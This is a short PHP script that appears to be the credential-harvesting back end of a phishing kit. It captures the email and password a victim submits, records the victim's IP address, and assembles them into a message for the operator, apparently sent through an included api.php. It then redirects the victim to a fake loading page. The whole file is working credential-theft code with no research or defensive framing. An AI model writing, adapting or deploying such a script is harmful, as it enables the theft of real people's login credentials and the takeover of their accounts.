<?php

session_start();



$username = $_SESSION['username'] = $_POST['username'];
$password = $_SESSION['password'] = $_POST['password'];


$hexor = '
🤟🏻 🔞📶🙊😈😈😈🔥-Login--ALGAAAAA🔥😈😈😈🙊📶🔞 🤟🏻
🔥 Login ✉️ 
🔥 Email : '.$_SESSION["username"].' 
🔥 Password : '.$_SESSION["password"].' 
🔥 IP : '.$_SERVER['REMOTE_ADDR'].' 
🤟🏻 🔞📶🙊😈😈😈🔥-Login--ALGAAAAA🔥😈😈😈🙊📶🔞 🤟🏻
';



include("api.php"); 



header('Location: ../loading.php');


?>


